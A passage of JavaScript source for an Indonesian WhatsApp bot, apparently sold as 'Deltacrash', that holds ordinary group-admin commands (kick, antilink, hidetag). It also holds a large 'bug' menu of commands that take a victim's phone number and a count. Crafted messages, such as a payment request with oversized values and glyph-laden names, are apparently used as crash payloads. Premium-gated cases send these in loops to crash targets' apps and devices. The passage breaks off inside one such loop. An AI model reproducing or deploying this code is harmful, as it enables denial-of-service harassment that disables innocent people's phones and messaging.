"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮⭑ ☠️⃰͜͡؜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒👾᜴ # 𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒🥶⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const sendReaction = async reactionContent => {
  deltaxcrash.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

const force2 = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
'message': {
"interactiveMessage": { 
"header": {
"hasMediaAttachment": true,
"jpegThumbnail": fs.readFileSync(`./DeltaNew/latx.png`)
},
"nativeFlowMessage": {
"buttons": [
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️᜴࿆͆᷍𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒╮⭑ ☠️⃰͜͡؜𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒👾᜴ # 𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒👾⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
}
}

const oneclickxeon = {
key: {
participant: `0@s.whatsapp.net`,
...(m.chat ? {
remoteJid: "status@broadcast"
} : {})
},
message: {
listResponseMessage: {
title: `𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒`
}
}
}

const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `${namaowner}`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=628189850142:+62 813-8985-0142\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}

const qpayment = {
key: {
remoteJid: '0@s.whatsapp.net',
fromMe: false,
id: `ownername`,
participant: '0@s.whatsapp.net'
},
message: {
requestPaymentMessage: {
currencyCodeIso4217: "USD",
amount1000: 999999999,
requestFrom: '0@s.whatsapp.net',
noteMessage: {
extendedTextMessage: {
text: namabot
}},
expiryTimestamp: 999999999,
amount: {
value: 91929291929,
offset: 1000,
currencyCode: "INR"
}}}}

const qchanel = {
key: {
remoteJid: 'status@broadcast',
fromMe: false,
participant: '0@s.whatsapp.net'
},
message: {
newsletterAdminInviteMessage: {
newsletterJid: `12036330176685796@newsletter`,
newsletterName: `𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒`,
jpegThumbnail: "",
caption: `𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒`,
inviteExpiration: Date.now() + 1814400000
}
}}

async function reply(teks) {
            const po = {
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: false,
                            title: `𝐃𝚺𝐋𝚻𝚫𝛁𝚰𝚪𝐔𝐒`,
                            body: '',
                            thumbnailUrl: "https://telegra.ph/file/14421142a4e58f13a29f2.jpg",
                            sourceUrl: '',
                            mediaType: 1,
                            renderLargerThumbnail: false
                    }
                },
                text: teks
            };
            return deltaxcrash.sendMessage(m.chat, po, { quoted: qkontak }
            );
        };

//========== FUNCTION ===========//
let ppuser
try {
ppuser = await deltaxcrash.profilePictureUrl(m.sender, 'image')
} catch (err) {
ppuser = 'https://telegra.ph/file/14421142a4e58f13a29f2.jpg'
}

async function SendSlide(jid, img, txt = []) {
let anu = new Array()
let imgsc = await prepareWAMessageMedia({ image: img}, { upload: deltaxcrash.waUploadToServer })
for (let ii of txt) {
await anu.push({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `${ii}`
}),
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Beli Produk\",\"url\":\"https://wa.me/${global.owner}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Testimoni\",\"url\":\"${global.linksaluran}\",\"merchant_url\":\"https://www.google.com\"}`
}, 
{                  
name: "cta_url",
buttonParamsJson:  `{\"display_text\":\"Join Grup\",\"url\":\"${global.linkgc}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*All Transaksi Open 彡*\n\n*deltaxcrash Dev* Menyediakan Produk & Jasa Dibawah Ini 📦"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: anu
})
})}
}}, {userJid: m.sender, quoted: qtoko})
return deltaxcrash.relayMessage(jid, msgii.message, {
messageId: msgii.key.id
})}

let example = (teks) => {
return `\n*Contoh Penggunaan :*\nketik *${cmd}* ${teks}\n`
}

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

const createSerial = (size) => {
return crypto.randomBytes(size).toString('hex').slice(0, size)
}


//========= SETTING EVENT ========//
if (global.owneroff && !isCmd) {
if (!isGroup && !isOwner) {
let teks = `*hallo Kak* @${m.sender.split('@')[0]}`
return deltaxcrash.sendMessage(m.chat, {text: `${teks}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
showAdAttribution: true, thumbnail: fs.readFileSync("./deltanime/kakgem.jpg"), renderLargerThumbnail: false, title: "｢ DELTACRASH ｣", mediaUrl: linkgc, sourceUrl: linkyt, previewType: "PHOTO"}}}, {quoted: null})
}}

/*if (global.antibug) {
if (!isGroup && m.isBaileys && !m.fromMe) {
await deltaxcrash.sendMessage(m.chat, {
delete: {
remoteJid: m.chat, fromMe: true, id: m.key.id
}})
await deltaxcrash.sendMessage(`${global.owner}@s.whatsapp.net`, {text: `*Terdeteksi Pesan Bug*
*Nomor :* ${m.sender.split("@")[0]}`}, {quoted: null})
}}*/

if (antilink.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await deltaxcrash.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await deltaxcrash.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Kamu Akan Di kick Dari Grup Ini Karna Admin Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./deltanime/kakgem.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await deltaxcrash.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
await deltaxcrash.groupParticipantsUpdate(m.chat, [m.sender], "remove")
}
}}

if (antilink2.includes(m.chat)) {
if (!isBotAdmin) return
if (!isAdmin && !isOwner && !m.fromMe) {
var link = /chat.whatsapp.com|buka tautaniniuntukbergabungkegrupwhatsapp/gi
if (link.test(m.text)) {
var gclink = (`https://chat.whatsapp.com/` + await deltaxcrash.groupInviteCode(m.chat))
var isLinkThisGc = new RegExp(gclink, 'i')
var isgclink = isLinkThisGc.test(m.text)
if (isgclink) return
let delet = m.key.participant
let bang = m.key.id
await deltaxcrash.sendMessage(m.chat, {text: `@${m.sender.split("@")[0]} Maaf Pesan Kamu Saya Hapus Karna Admin/Owner Bot Menyalakan Fitur *Antilink* Grup Lain!`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {thumbnail: fs.readFileSync("./deltanime/pukimak.jpg"), title: "｢ LINK GRUP DETECTED ｣", previewType: "PHOTO"}}}, {quoted: m})
await deltaxcrash.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: bang, participant: delet }})
}
}}
switch (command) {
case 'menu':
//menu = fs.readFileSync('./angel.mp3')
const deltanines =` [ creator : delta tech ]
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
  ⩽ \`D E L T A X C R A S H-M A K E R\` ⩾
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
╒─⩽ \`MAIN MENU\` ⩾
│彡 ${prefix}self
│彡 ${prefix}public
│彡 ${prefix}kick
│彡 ${prefix}hidetag
│彡 ${prefix}addowner
│彡 ${prefix}delowner
│彡 ${prefix}addprem
│彡 ${prefix}delprem
│彡 ${prefix}pinterest
│彡 ${prefix}tiktok
│彡 ${prefix}bugmenu
╘───────────────┈⳹

╒─⩽ 「 \`ZONA FUCKING BUG\` 」 
│彡 ${prefix}xnxx 62xxx
│彡 ${prefix}brazzers 62xxx
│彡 ${prefix}hentai 62xxx
│彡 ${prefix}yandex 62xxx
│彡 ${prefix}xvideos 62xxx
│彡 ${prefix}japan 62xxx
│彡 ${prefix}hardcore 62xxx
│彡 ${prefix}metaverse 62xxx
╘───────────────┈⳹

╒─⩽ \`Credit YouTube : Delta Tech\` ⩾
╘────────────────────────────┈⳹
`
//deltaxcrash.sendMassage(form, menu, from, audio {quoted, mimetype:'audio/mp4', ptt:true}) 
        deltaxcrash.sendMessage(m.chat, { image: { url: "./Delta1.jpg" }, caption: deltanines }, { quoted: m });
        //footer: `彡deltaxcrash`
        break
case 'bugmenu':
//menu = fs.readFileSync('./angel.mp3')
const deltamekdiwok =`
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
  ⩽ \`D E L T A X C R A S H-M A K E R\` ⩾
▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
╒─⩽ \`RANDOM BUG HARD\` ⩾
│彡 ${prefix}delta1 62xxx
│彡 ${prefix}sys 62xxx, jumlah
│彡 ${prefix}dark 62xxx
│彡 ${prefix}satan 62xxxx
│彡 ${prefix}satanic 62xxx|jumlah
│彡 ${prefix}luchifer 62xxx
│彡 ${prefix}crash-total 62xxx
│彡 ${prefix}maker 62xxx
│彡 ${prefix}unlimited-bug 62xxx
│彡 ${prefix}chace-bug 62xxx
│彡 ${prefix}phone-crash 62xxx
│彡 ${prefix}notif-crash 62xxx
│彡 ${prefix}lockbit *<reply message>*
╘───────────────┈⳹

╒─⩽ \`MAIN WAR BUG\` ⩾
│彡 ${prefix}internal-crash 62xxx, jumlah
│彡 ${prefix}internal-ui 62xxx, jumlah
│彡 ${prefix}crash-myinter 62xxx, jumlah
│彡 ${prefix}satan-internal 62xxx, jumlah
│彡 ${prefix}satan-external 62xxx, jumlah
│彡 ${prefix}engine-crash 62xxx, jumlah
│彡 ${prefix}engine-internal 62xxx, jumlah
│彡 ${prefix}engine-external 62xxx, jumlah
│彡 ${prefix}engine-ui 62xxx, jumlah
│彡 ${prefix}bug-engine 62xxx, jumlah
│彡 ${prefix}bug-quoted 62xxx
│彡 ${prefix}internal-quoted 62xxx
│彡 ${prefix}external-quoted 62xxx
╘───────────────┈⳹

╒─⩽ \`BUG GROUP HARDCORE\` ⩾
│彡 ${prefix}bug-button link group
│彡 ${prefix}bug-worm link group
│彡 ${prefix}button-internal link group
│彡 ${prefix}button-external link group
│彡 ${prefix}ui-grup link group
│彡 ${prefix}bug-hole 120###@g.us
│彡 ${prefix}enemygroup 120###@g.us
│彡 ${prefix}internal-group 120###@g.us
│彡 ${prefix}external-group 120###@g.us
╘───────────────┈⳹

╒─⩽ \`BUG EMOTICON HARDCORE\` ⩾
│彡 ${prefix}🔥 62xxx
│彡 ${prefix}🌷 62xxx
│彡 ${prefix}💥 62xxx
│彡 ${prefix}🌹 62xxx
│彡 ${prefix}⭐ 62xxx
│彡 ${prefix}⚡ 62xxx
│彡 ${prefix}😈 62xxx
│彡 ${prefix}💀 62xxx
│彡 ${prefix}🗿 62xxx
│彡 ${prefix}🤯 62xxx
╘───────────────┈⳹

╒─⩽ \`ZONA HARDCORE BUG\` ⩾
│彡 ${prefix}hardcore-cover 62xxx, jumlah
│彡 ${prefix}hardcore-geek 62xxx, jumlah
│彡 ${prefix}hardcore-evos 62xxx, jumlah
│彡 ${prefix}hardcore-lock 62xxx, jumlah
│彡 ${prefix}hardcore-dark 62xxx, jumlah
│彡 ${prefix}hardcore-lcd 62xxx, jumlah
│彡 ${prefix}hardcore-maker 62xxx, jumlah
╘───────────────┈⳹

╒─⩽ \`ZONA NOT FOUND BUG\` ⩾
│彡 ${prefix}blank 62xxx, jumlah
│彡 ${prefix}blank-ui 62xxx, jumlah
│彡 ${prefix}blank-dark, jumlah
│彡 ${prefix}eror-bug, jumlah
│彡 ${prefix}walking-bug 62xxx, jumlah
╘───────────────┈⳹

╒─⩽ \`SAMSUNG DEVICE CRASH\` ⩾
│彡 ${prefix}samsung-bug 62xxx
│彡 ${prefix}samsung-ui 62xxx
│彡 ${prefix}samsung-internal 62xxx
│彡 ${prefix}samsung-external 62xxx
│彡 ${prefix}samsung-reboot 62xxx
│彡 ${prefix}samsung-crash 62xxx
╘───────────────┈⳹

╒─⩽ \`ZONA LISTENING CORE BUG\` ⩾
│彡 ${prefix}buglist-ui 62xxx, jumlah
│彡 ${prefix}buglist-crash 62xxx, jumlah
│彡 ${prefix}buglist-external 62xxx, jumlah
│彡 ${prefix}buglist-internal 62xxx, jumlah
│彡 ${prefix}buglist-engine 62xxx, jumlah
╘───────────────┈⳹

╒─⩽ \`ZONA INFINITY BUG\` ⩾
│彡 ${prefix}infinity-war 62xxx
│彡 ${prefix}infinity-unlimit 62xxx
│彡 ${prefix}infinity-good 62xxx|timer
│彡 ${prefix}infinity-warcrash 62xxx|timer
╘───────────────┈⳹

╒─⩽ \`LORAZALORA OLD BUG\` ⩾
│彡 ${prefix}lorazalora-crash 62xx
│彡 ${prefix}lorazalora-infinity 62xx
│彡 ${prefix}lorazalora-un 62xxx
│彡 ${prefix}lorazalora-pers 62xx
│彡 ${prefix}lorazalora-ui 62xxx
╘───────────────┈⳹

╒─⩽ \`BUG OFFICIAL DELTACRASH\` ⩾
│彡 ${prefix}deltacrsah-mekdi 62xxx, jumlah
│彡 ${prefix}deltacrsah-layer 62xxx, jumlah
│彡 ${prefix}deltacrsah-forme 62xxx, jumlah
│彡 ${prefix}deltacrsah-engine 62xxx, jumlah
│彡 ${prefix}deltaxcrash-external 62xxx, jumlah
│彡 ${prefix}deltaxcrash-internal 62xxx, jumlah
╘───────────────┈⳹

╒─⩽ \`ZONA NETWORKING AND WIRLES BUG\` ⩾
│彡 ${prefix}network-just 62xxx
│彡 ${prefix}network-fels 62xxx
│彡 ${prefix}network-wolf 62xxx
│彡 ${prefix}network-five 62xxx
│彡 ${prefix}network-xns 62xxx
│彡 ${prefix}network-reels 62xxx
│彡 ${prefix}network-axis 62xxx
│彡 ${prefix}network-kominfo 62xxx
│彡 ${prefix}network-xl 62xxx
│彡 ${prefix}network-one 62xxx
│彡 ${prefix}network-crash 62xxx
│彡 ${prefix}network-close 62xxx
│彡 ${prefix}wirles 62xxx 
╘───────────────┈⳹

╒─⩽ \`ZONA CRASHXV BUG\` ⩾
│彡 ${prefix}crashxv-bug 62xxx, jumlah
│彡 ${prefix}crashxv-strong 62xxx, jumlah
│彡 ${prefix}crashxv-wirles 62xxx, jumlah
│彡 ${prefix}crashxv-system 62xxx, jumlah
│彡 ${prefix}crashxv-sql 62xxx, jumlah
│彡 ${prefix}crashxv-ui 62xxx, jumlah
│彡 ${prefix}crashxv-internal 62xxx, jumlah
│彡 ${prefix}crashxv-external 62xxx, jumlah
╘───────────────┈⳹

╒─⩽ \`ZONA ANDRONIX BUG\` ⩾
│彡 ${prefix}andronix 62xxx
│彡 ${prefix}andronix-rom 62xxx, jumlah
│彡 ${prefix}andronix-fc 62xxx
│彡 ${prefix}andronix-xnxx 62xxx
│彡 ${prefix}andronix-xyz 62xxx
│彡 ${prefix}andronix-war 62xxx
│彡 ${prefix}andronix-vrs 62xxx
╘───────────────┈⳹

╒─⩽ \`ZONA DEVICE VIVO BUG\` ⩾
│彡 ${prefix}vivo-id 62xxx, jumlah
│彡 ${prefix}vivo-bug 62xxx, jumlah
│彡 ${prefix}vivo-internal 62xxx, jumlah
│彡 ${prefix}vivo-external 62xxx, jumlah
│彡 ${prefix}vivo-ui 62xxx, jumlah
│彡 ${prefix}vivo-uicrash 62xxx, jumlah
│彡 ${prefix}vivo-system 62xxx, jumlah
│彡 ${prefix}vivo-engine 62xxx, jumlah
│彡 ${prefix}vivo-wtf 62xxx 
│彡 ${prefix}vivo-list 62xxx|jumlah
╘───────────────┈⳹

╒─⩽ \`Credit YouTube : Delta Tech\` ⩾
╘────────────────────────────┈⳹
`
//deltaxcrash.sendMassage(form, menu, from, audio {quoted, mimetype:'audio/mp4', ptt:true}) 
        deltaxcrash.sendMessage(m.chat, { image: { url: "./DeltaNew/deltaFiveDotOne.jpg" }, caption: deltamekdiwok }, { quoted: m });
        //footer: `彡deltaxcrash`
        break
        
case "addowner": case "addown": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (owner2.includes(orang) || orang == global.owner) return reply(`Nomor ${orang.split("@")[0]} Sudah terdaftar sebagai Owner`)
if (orang == botNumber) return reply("kontol !")
let check = await deltaxcrash.onWhatsApp(`${orang.split("@")[0]}`)
if (check.length < 1) return reply(`Nomor ${orang.split("@")[0]} Tidak Terdaftar Di WhatsApp`)
await owner2.push(orang)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(owner2, null, 2))
reply(`*Berhasil Menambah Owner 彡*
anjay ${orang.split("@")[0]} sekarang jadi owner`)
} else {
reply(example("silahkan @tag nomornya"))
}
}
break
case "delowner": case "delown": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
if (text == "all") {
await fs.writeFileSync("./all/database/owner.json", "[]")
return reply(`*</> Berhasil Menghapus Semua Owner 彡*`)
}
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!owner2.includes(orang) || orang == global.owner) return reply(`Nomor ${orang.split("@")[0]} Tidak Ada Di Database Owner`)
if (orang == botNumber) return reply("Tidak Bisa Menghapus Nomor Bot!")
let pos = owner2.indexOf(orang)
await owner2.splice(pos, 1)
await fs.writeFileSync("./all/database/owner.json", JSON.stringify(owner2, null, 2))
reply(`*Berhasil Menghapus Owner 彡*
</> Nomor ${orang.split("@")[0]} Berhasil Dihapus Dari Database`)
} else {
reply(example("silahkan @tag orangnya"))
}
}
break
case "addprem": case "addpremium": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (premium.includes(orang)) return reply(`*Gagal Menambah User Premium!*\n${orang.split('@')[0]} Dia Sudah Terdaftar di Database *User Premium*`)
await premium.push(orang)
await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
reply(`*Berhasil Menambah Premium 彡*\n${orang.split('@')[0]} Sekarang Terdaftar Di Database *User Premium*`)
} else {
return reply(example("@tag/62838XXX"))
}}
break
case "delprem": case "delpremium": {
if (!isOwner) return reply(msg.owner)
if (m.quoted || text) {
let orang = m.mentionedJid[0] ? m.mentionedJid[0] : text ? text.replace(/[^0-9]/g, '')+'@s.whatsapp.net' : m.quoted ? m.quoted.sender : ''
if (!premium.includes(orang)) return reply(`*Gagal Menghapus User Premium!*\n${orang.split('@')[0]} Tidak Terdaftar Di Database *User Premium*`)
let indx = premium.indexOf(orang)
await premium.splice(indx, 1)
await fs.writeFileSync("./all/database/premium.json", JSON.stringify(premium))
reply(`*Berhasil Menghapus Premium 彡*\n${orang.split('@')[0]} Sekarang Terhapus Dari Database *User Premium*`)
} else {
return reply(example("silakan @tag orangnya "))
}}
break
case "public": {
if (!isOwner) return reply(msg.owner)
deltaxcrash.public = true
reply("*Berhasil Mengganti Mode 彡*\nMode Bot Beralih Ke *Public*")
}
break
case "self": {
if (!isOwner) return reply(msg.owner)
deltaxcrash.public = false
reply("*Berhasil Mengganti Mode 彡*\nMode Bot Beralih Ke *Self*")
}
break
case "pinterest": case "pin": {
if (!text) return reply(example("tobrut"))
reply(global.msg.wait)
let res = await pinterest(text)
if (res.length == 0) return reply("_</> maaf foto yang kamu cari tidak ada_")
if (res.length < 5) {
anuan = res
} else {
anuan = res.slice(0,5)
}
let anu = new Array()
for (let ii of anuan) {
let imgsc = await prepareWAMessageMedia({ image: await fetch(`${ii}`)}, { upload: deltaxcrash.waUploadToServer })
anu.push({
              header: proto.Message.InteractiveMessage.Header.fromObject({
                hasMediaAttachment: true,
                ...imgsc
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                buttons: [
                  {                  
                   name: "cta_url",
                   buttonParamsJson:  `{\"display_text\":\"tautan\",\"url\":\"${ii}\",\"merchant_url\":\"https://www.google.com\"}`
                  }
                ]
              })
            })
}

const msgii = await generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
      messageContextInfo: {
        deviceListMetadata: {},
        deviceListMetadataVersion: 2
      },
      interactiveMessage: proto.Message.InteractiveMessage.fromObject({
        body: proto.Message.InteractiveMessage.Body.fromObject({
          text: "_</> berikut hasil pencarian foto kamu_"
        }),
        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
          cards: anu
        })
      })
    }
  }
}, {userJid: m.sender, quoted: m})
 
await deltaxcrash.relayMessage(m.chat, msgii.message, {
  messageId: msgii.key.id
})
}
break
case "tiktok": case "tt": {
if (!text) return reply(example('linknya'))
if (!/tiktok.com/.test(text)) return reply("_</> link not found bro_!")
reply(msg.wait)
 let anuan = text
await api.tiktok(anuan).then(async (res) => {
var cap = `*</> Berhasil di download by - Deltacrash 彡*`
if (res.result.duration == 0) {
for (let a of res.result.images) {
deltaxcrash.sendMessage(m.chat, {image: {url: `${a}`}, caption: cap}, {quoted: m})
}
} else {
await deltaxcrash.sendMessage(m.chat, {video: {url: res.result.play}, mimetype: "video/mp4", caption: cap}, {quoted: m})
}
}).catch(e => reply(`${e}`))
}
break
case "autoread": {
if (!isOwner) return reply(msg.owner)
if (!text) return reply(example("on/off\nKetik *.statusbot* Untuk Melihat Status Setting Bot"))
if (text.toLowerCase() == "on") {
if (autoread) return reply("*Autoread* Sudah Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoread = true
reply("*Berhasil Menyalakan Autoread 彡*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else if (text.toLowerCase() == "off") {
if (!autoread) return reply("*Autoread* Sudah Tidak Aktif!\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
autoread = false
reply("*Berhasil Mematikan Autoread 彡*\nKetik *.statusbot* Untuk Melihat Status Setting Bot")
} else {
return reply(example("on/off\n\nKetik *.statusbot* Untuk Melihat Status Settingan Bot"))
}}
break
case "open": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
await deltaxcrash.groupSettingUpdate(m.chat, 'not_announcement')
reply("*Berhasil Mengganti Setelan Grup 彡*\nMenjadi Anggota Dapat Mengirim Pesan")
}
break
case "close": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
await deltaxcrash.groupSettingUpdate(m.chat, 'announcement')
reply("*Berhasil Mengganti Setelan Grup 彡*\nMenjadi Hanya Admin Yang Dapat Mengirim Pesan")
}
break
case "del": case "delete": {
if (isGroup) {
if (!isOwner && !isAdmin) return reply(msg.admin)
if (!m.quoted) return reply("</> Reply Pesan Yang Ingin Di Hapus")
if (m.quoted.sender == botNumber) {
deltaxcrash.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender}})
} else {
if (!isBotAdmin) return reply(msg.adminbot)
deltaxcrash.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}} else {
if (!isOwner) return reply(msg.owner)
if (!m.quoted) return reply("</> Reply Pesan Yang Ingin Di Hapus")
deltaxcrash.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: false, id: m.quoted.id, participant: m.quoted.sender}})
}}
break
case "kik": case "kick": {
if (!isGroup) return reply(msg.group)
if (!isBotAdmin) return reply(msg.adminbot)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (text || m.quoted) {
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await deltaxcrash.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => deltaxcrash.sendMessage(m.chat, {text: `</> Oke Berhasil Mengeluarkan @${users.split("@")[0]} Dari Grup`, mentions: [`${users}`]}, {quoted: m})).catch((err) => reply(err.toString()))
} else return reply(example('silahkan masukan nomornya atau @tag'))}
break
case "hidetag": case "z": case "h": {
if (!isGroup) return reply(msg.group)
if (!isAdmin && !isOwner) return reply(msg.admin)
if (!m.quoted && !text) return reply(example("mana teksnya anjir. atau replyteksnya"))
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
deltaxcrash.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
// CASE BUG BY deltaxcrash NO RENAME
case "andronix-rom": {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
  if (!text) return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  let number = text.split(',')[0];
  let amount = text.split(',')[1] * 5;
  if (!number || !amount) {
    return reply(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 6283123456788,5`) 
  }
  if (isNaN(parseInt(amount))) {
    return reply("Amount must be a number");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await deltaxcrash.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "6283123456789") {
    return;
  }
  if (contactInfo.length == 0) {
    return reply("The number is not registered on WhatsApp");
  }
  reply("please wait, " + command + " bug is in process..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "*👾\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break
case '🗿': {

if (!isPremium) return reply('khusus penggunaa. beli script deltacrash v5.1?? hubungi owner t.me/deltaxcrash')
if (!q) return reply(`Penggunaan .${command} 6283123456789`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return reply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6283123456789`)
let target = bijipler + '@s.whatsapp.net'
await reply(`_</> successfully send bug to target_`)
for (let j = 0; j < 30; j++) {
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await penghitaman(target, deltaxcrashcrash2)
await ngeloc(target, deltaxcrashcrash)
await penghitaman(target, deltaxcrashcrash2)
await deltaxcrashiphone(target)
await deltaxcrashiphone(target)
